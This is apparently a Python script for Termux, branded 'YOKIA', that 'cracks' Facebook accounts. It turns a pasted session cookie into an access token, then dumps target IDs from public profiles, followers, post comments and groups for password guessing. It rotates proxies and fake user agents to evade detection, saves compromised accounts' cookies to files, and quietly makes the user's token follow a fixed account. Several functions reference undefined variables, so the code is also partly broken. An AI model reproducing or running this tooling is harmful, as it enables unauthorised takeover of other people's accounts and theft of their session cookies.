def modules():
	print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHECKING FOR UPDATES \x1b[37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import requests
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m REQUESTS IS BEING INSTALLED \x1b[37m")
		os.system('pip install requests --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m REQUESTS HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m BS4 IS BEING INSTALLED \x1b[37m")
		os.system('pip install bs4 --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m BS4 HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import rich
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m RICH IS BEING INSTALLED \x1b[37m")
		os.system('pip install rich --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m RICH HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	exit()

try:
	import requests as req, re,time,os
	from bs4 import BeautifulSoup as par
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

version='0.0.1'
file_name=[]
ugen2=[]
logincookie=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ualuh=[]
count = 0
loop = 0
lim = 0
tp = 0
ok = []
cp = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
sys.stdout.write('\x1b]2; YOKIA \x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}


#------------------[ PROXY ]-------------------#

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:pass 
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')

def getKey():

    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    bxd = ""
    bumper = bxd+id+xp
    return bumper
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
    os.system('pip install requests futures==2 > /dev/null')
    

    
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as GsASIF
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
def l():
    vivo = random.choice(["U3", "1002T", "C", "1605", "730", "A5", "A54", "a57", "A87",
    "C8818", "EGO", "E1", "E3", "E5", "X21", "X21i", "X2s", "X23",
    "iQOO", "X5Max5", "X5V", "X60t", "X6S", "X7", "X70", "Xplay", "Xshot",
    "Y01", "Y01A", "Y02", "Y02s", "V1", "V11", "V11s", "Y13T", "Nex",
    "S1", "S10", "S11", "S11t", "S12", "S13", "S15", "S15e", "S1PRO",
    "S20", "S21", "S31", "S5", "S6", "S6T", "S7", "S76", "S7e",
    "S7t", "S7w", "S9", "S9e", "T1", "T1x", "T2", "T2x", "E1",
    "U10", "U20", "X20", "X1w", "23x", "V77e", "Y613F", "Y628", "X3S",
    "Z1", "Z10", "Z1i", "Z1LITE", "Z1PRO", "Z1x", "Z34"])
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/'+str(vivo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua
#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-------------------[APK]--------------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================') 
#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/YOKIAexeee')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    

#------------------[ LOGO-LAKNAT ]-----------------#

logo=("""    
__   __    _    _       
 \ \ / /__ | | _(_) __ _                    
  \ V / _ \| |/ / |/ _` |            \x1b[37m\x1b[38;5;196m
   | | (_) |   <| | (_| |
   |_|\___/|_|\_\_|\__,_|  0.0.1""")
                         
                                     
                                     
def info():
	print(f"""\x1b[37m----------------------------------------------
 AUTHOR     : YO-KIA
 GITHUB     : PRABEJ
 FACEBOOK   : THE DARK HUNTER
 VERSION    : \x1b[37m\x1b[38;5;196m{version}\x1b[37m
\x1b[37m----------------------------------------------""")
def banner():
	print(logo)

#------------------[ ACCOUNT CREATION DATE]-----------------#

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:4] in ['6155']            :tahunz = '2024'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "

#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    info()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
        linex()
        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()
 
#----------------------[login]---------------------#
def login():
	try:
		token = open('.listrik.txt','r').read()
		cok = open('.kueh.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
			main_menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
         #===========cookie & TOKEN LIST===========#
def login_lagi334():
	try:
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		print(logo)
		cookie=input(f'\033[1;31m[\033[1;96mâ€¢\033[1;31m] \033[1;33mCOOKIE :{asu} ')
		open(".kueh.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".listrik.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'\033[1;31m[\033[1;96mâ€¢\033[1;31m] \033[1;33mRUN AGAIN ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .listrik.txt")
		os.system("rm -f .kueh.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#-----------------------[MENU]----------------------#
def menu(my_id,my_name):
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")
	linex()
	print(f""" \x1b[38;5;196m[\x1b[37m--->1\x1b[38;5;196m]\x1b[37m CRACK MENU   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m--->2\x1b[38;5;196m]\x1b[37m FILE MENU      """)   
	print(f""" \x1b[38;5;196m[\x1b[37m--->3\x1b[38;5;196m]\x1b[37m CHECK RESULTS      """)
	print(f""" \x1b[38;5;196m[\x1b[37m--->4\x1b[38;5;196m]\x1b[37m JOIN GROUPS""")
	print(f""" \x1b[38;5;196m[\x1b[37m--->0\x1b[38;5;196m]\x1b[37m CONTACT ADMIN""")
	linex()
	_____parbejjjjjjj_____ = input(' CHOOSE : ')
	if _____parbejjjjjjj_____ in ['1']:
		main_menu()
	elif _____parbejjjjjjj_____ in ['2']:
		fileclone()
	elif _____parbejjjjjjj_____ in ['3','03']:
		passask()
		harryresults()
	elif _____parbejjjjjjj_____ in ['4','04']:
		group()
	elif _____parbejjjjjjj_____ in ['0']:
		contact()
	
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()
#-----------------[ HASIL-CRACK ]-----------------#
def main_menu(my_id,my_name):
	try:
		token = open('.listrik.txt','r').read()
		cok = open('.kueh.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")
	linex()
	print(f""" \x1b[38;5;196m[\x1b[37m--->1\x1b[38;5;196m]\x1b[37m CRACK PUBLIC  """)    
	print(f""" \x1b[38;5;196m[\x1b[37m--->2\x1b[38;5;196m]\x1b[37m CRACK FOLLOWER   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m--->3\x1b[38;5;196m]\x1b[37m CRACK COMMENTS   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m--->4\x1b[38;5;196m]\x1b[37m CRACK GROUP  """)    
	print(f""" \x1b[38;5;196m[\x1b[37m--->5\x1b[38;5;196m]\x1b[37m CRACK EMAIL   """)    
	print(f""" \x1b[38;5;196m[\x1b[37m--->6\x1b[38;5;196m]\x1b[37m CRACK FILE [VIA]  """)    
	ask = input(f' [{hh}>>{P}] CHOOSE : ')
	print(' ─────────────────────────────')
	if _____parbejjjjjjj_____ in ['1']:
		harry_public()
	elif _____parbejjjjjjj_____ in ['2']:
		crack_foll(t,c)()
	elif _____parbejjjjjjj_____ in ['3','03']:
		crack_komen()
	elif _____parbejjjjjjj_____ in ['4','04']:
		crack_group()
	elif _____parbejjjjjjj_____ in ['5','05']:
		clon_email()
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()
#
def crack_komen():
	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] gagal dump komen')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r WAIT DUMPING START {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "SEE PREVIOUS COMMENTS…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
#----------------------#
def crack_foll(t,c):
	account = input(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC \n ACCOUNT: ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		setting()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] SORRY!!! ACCOUNT IS NOT PUBLIC")		
#-----------------[MENU-CRACK---------------------#
def harryresults():
    ok_file_path = '/sdcard/YOKIA/YOKIA-OK.txt'
    cp_file_path = '/sdcard/YOKIA/YOKIA-CP.txt'

    if not (os.path.exists(ok_file_path) and os.path.exists(cp_file_path)):
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m NO IDS SAVED")
        return
    linex()
    print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CHECK OK IDS \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CHECK CP IDS")
    linex()
    user_choice = input(" CHOOSE : ")

    if user_choice == '1':
        linex()
        show_cookies = input(" \x1b[38;5;196m[\x1b[37m>\x1b[38;5;196m]\x1b[37m SHOW COOKIES (y/n): ").lower() == 'y'
        linex()
        process_file(ok_file_path, show_cookies)
    elif user_choice == '2':
        linex()
        process_file(cp_file_path, show_cookies=False)
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID CHOICE ")

def process_file(file_path, show_cookies):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    for i, line in enumerate(lines, start=1):
        parts = line.strip().split('|')
        if show_cookies:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m  {parts[0]} • {parts[1]}")
            kuki = parts[2]
            print(f" [🍪] {kuki}")
        else:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m {parts[0]} | {parts[1]}")
    linex()
    input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TO EXIT ");restart()
#-------------------[ CRACK-PUBLIK ]----------------#
def contact():
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m--->1\x1b[38;5;196m]\x1b[37m CONTACT WHATSAPP")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m--->2\x1b[38;5;196m]\x1b[37m CONTACT TELEGRAM")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m--->3\x1b[38;5;196m]\x1b[37m CONTACT FACEBOOK")
    linex()
    lgmt = input(' CHOOSE : ')
    if lgmt == '1':
        whatsapp()
    elif lgmt == '2':
        telegram()
    elif lgmt == '3':
        facebook()
    else:
        linex()
        animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
        restart()
def whatsapp():
	os.system('xdg-open wa.me/+9779765752720')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
	
def telegram():
	os.system('xdg-open https://t.me/+9779804791363')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")	

def facebook():
	os.system('xdg-open https://www.facebook.com/prabej.khan.944?mibextid=JRoKGi')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")	

#-------------------[ GROUPS ]----------------#
def group():
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m--->1\x1b[38;5;196m]\x1b[37m CONTACT WHATSAPP")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m--->2\x1b[38;5;196m]\x1b[37m CONTACT TELEGRAM")
    print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m--->3\x1b[38;5;196m]\x1b[37m CONTACT FACEBOOK")
    linex()
    lgmt = input(' CHOOSE : ')
    if lgmt == '1':
        whatsapp()
